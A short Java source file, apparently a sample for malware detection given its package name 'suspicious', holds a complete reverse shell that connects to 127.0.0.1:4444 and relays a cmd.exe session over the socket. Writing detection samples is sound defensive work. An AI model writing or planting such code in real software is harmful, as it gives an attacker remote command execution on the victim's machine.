package suspicious;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class SuspiciousRevShell {
    public void connectShell() throws Exception {
        Socket s = new Socket("127.0.0.1", 4444);
        Process p = Runtime.getRuntime().exec("cmd.exe");
        InputStream pi = p.getInputStream();
        OutputStream po = p.getOutputStream();
        InputStream si = s.getInputStream();
        OutputStream so = s.getOutputStream();
        while (true) {
            if (pi.available() > 0) so.write(pi.read());
            if (si.available() > 0) po.write(si.read());
        }
    }
}